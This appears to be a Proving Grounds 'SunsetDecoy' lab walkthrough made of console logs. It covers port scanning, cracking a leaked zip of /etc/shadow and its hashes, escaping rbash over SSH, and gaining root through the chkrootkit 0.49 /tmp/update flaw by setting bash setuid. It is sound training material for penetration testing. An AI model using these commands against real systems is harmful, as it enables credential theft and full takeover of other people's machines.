
```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# nmap -Pn -sT -n 192.168.131.85 -p- --min-rate 1000 --max-retries 1 --reason -v
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 15:55 CDT
Initiating Connect Scan at 15:55
Scanning 192.168.131.85 [65535 ports]
Discovered open port 80/tcp on 192.168.131.85
Discovered open port 22/tcp on 192.168.131.85
Warning: 192.168.131.85 giving up on port because retransmission cap hit (1).
Connect Scan Timing: About 42.70% done; ETC: 15:56 (0:00:42 remaining)
Completed Connect Scan at 15:56, 69.89s elapsed (65535 total ports)
Nmap scan report for 192.168.131.85
Host is up, received user-set (0.077s latency).
Not shown: 62484 closed ports, 3049 filtered ports
Reason: 62484 conn-refused and 3049 no-responses
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 69.97 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# nmap -Pn -sT -sV -n 192.168.131.85 -p 22,80 --min-rate 1000 --max-retries 1 --reason 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 16:01 CDT
Nmap scan report for 192.168.131.85
Host is up, received user-set (0.13s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.38
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# nmap -Pn -sT -sV -sC  -n 192.168.131.85 -p 22,80 --min-rate 1000 --max-retries 1 --reason 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 16:01 CDT
Nmap scan report for 192.168.131.85
Host is up, received user-set (0.071s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
80/tcp open  http    syn-ack Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# wget http://192.168.131.85/save.zip
--2021-10-15 16:03:22--  http://192.168.131.85/save.zip
Conectando con 192.168.131.85:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3123 (3,0K) [application/zip]
Grabando a: “save.zip”

save.zip                            100%[===================================================================>]   3,05K  --.-KB/s    en 0,001s  

2021-10-15 16:03:22 (2,20 MB/s) - “save.zip” guardado [3123/3123]
```


```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# binwalk -e save.zip 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 668, uncompressed size: 1807, name: etc/passwd
752           0x2F0           Zip archive data, encrypted at least v2.0 to extract, compressed size: 434, uncompressed size: 1111, name: etc/shadow
1270          0x4F6           Zip archive data, encrypted at least v2.0 to extract, compressed size: 460, uncompressed size: 829, name: etc/group
1813          0x715           Zip archive data, encrypted at least v2.0 to extract, compressed size: 368, uncompressed size: 669, name: etc/sudoers
2266          0x8DA           Zip archive data, encrypted at least v2.0 to extract, compressed size: 140, uncompressed size: 185, name: etc/hosts
2489          0x9B9           Zip archive data, encrypted at least v1.0 to extract, compressed size: 45, uncompressed size: 33, name: etc/hostname
3101          0xC1D           End of Zip archive
```


```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' save.zip 


PASSWORD FOUND!!!!: pw == manuel
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# 
```


```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# unzip save.zip 
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname            
```


```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat hostname 
60832e9f188106ec5bcc4eb7709ce592
root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat hosts 
127.0.0.1	localhost
127.0.1.1	decoy

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# cat sudoers 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```


```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# unshadow passwd shadow > hashes.txt
root@kali:/OSCPv3/offsec_pg/SunsetDecoy/etc# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# ssh 296640a3b825115a47b68fc44501c828@192.168.131.85
296640a3b825115a47b68fc44501c8@192.168.131.85's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
-rbash: whoami: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ less
-rbash: less: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ftp
-rbash: ftp: command not found
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetDecoy# ssh 296640a3b825115a47b68fc44501c828@192.168.131.85 -t "bash --noprofile"
296640a3b825115a47b68fc44501c8@192.168.131.85's password: 
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
bash: whoami: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ less
bash: less: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls
honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  local.txt  ls  mkdir  user.txt
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/cat local.txt 
f539d346fd63f9aeda807814485edca1
```

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
PATH:/home/296640a3b825115a47b68fc44501c828/
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH="/bin:$PATH"
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
296640a3b825115a47b68fc44501c828
```

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ file honeypot.decoy
honeypot.decoy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c2d7512e6f628f98adb080abd295115cc9e0c2f, not stripped
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5
```


```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ more process.sh 
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod +x process.sh 
```

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
```

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./process.sh 
< ./honeypot.decoy
< sh -c /usr/sbin/service apache2 status
< systemctl status apache2.service
< pager
> /usr/sbin/CRON -f
> /bin/sh -c /bin/bash /root/script.sh
> /bin/bash /root/script.sh
> /bin/sh /root/chkrootkit-0.49/chkrootkit
< /usr/sbin/CRON -f
< /bin/sh -c /bin/bash /root/script.sh
< /bin/bash /root/script.sh
< /bin/sh /root/chkrootkit-0.49/chkrootkit
< [kworker/u2:2-events_unbound]
> [kworker/u2:2-flush-8:0]
< [kworker/u2:2-flush-8:0]
> [kworker/u2:2-events_unbound]
```
https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo 'chmod u+s /bin/bash' > /tmp/update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod 777 /tmp/update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```
```shell
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./process.sh
> /bin/sh /root/chkrootkit-0.49/chkrootkit
< /usr/sbin/CRON -f
< /bin/sh -c /bin/bash /root/script.sh
< /bin/bash /root/script.sh
< /bin/sh /root/chkrootkit-0.49/chkrootkit
< /bin/sh /root/chkrootkit-0.49/chkrootkit
< [kworker/u2:2-events_unbound]
> [kworker/u2:2-flush-8:0]
< [kworker/u2:2-flush-8:0]
> [kworker/u2:2-events_unbound]
< [kworker/u2:2-events_unbound]
> [kworker/u2:2-flush-8:0]
< [kworker/u2:2-flush-8:0]
> [kworker/u2:2-events_unbound]
< [kworker/u2:2-events_unbound]
> [kworker/u2:2-flush-8:0]
< [kworker/u2:2-flush-8:0]
> [kworker/u2:2-events_unbound]
```

```console
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# ls
honeypot.decoy	honeypot.decoy.cpp  id	ifconfig  local.txt  ls  mkdir	process.sh  user.txt
bash-5.0# cd /root/
bash-5.0# 
bash-5.0# ls
chkrootkit-0.49  proof.txt  root.txt  script.sh
bash-5.0# cat root.txt
Your flag is in another file...
bash-5.0# cat proof.txt
9c44f7969ac22a551f9565d15930577c
``` 




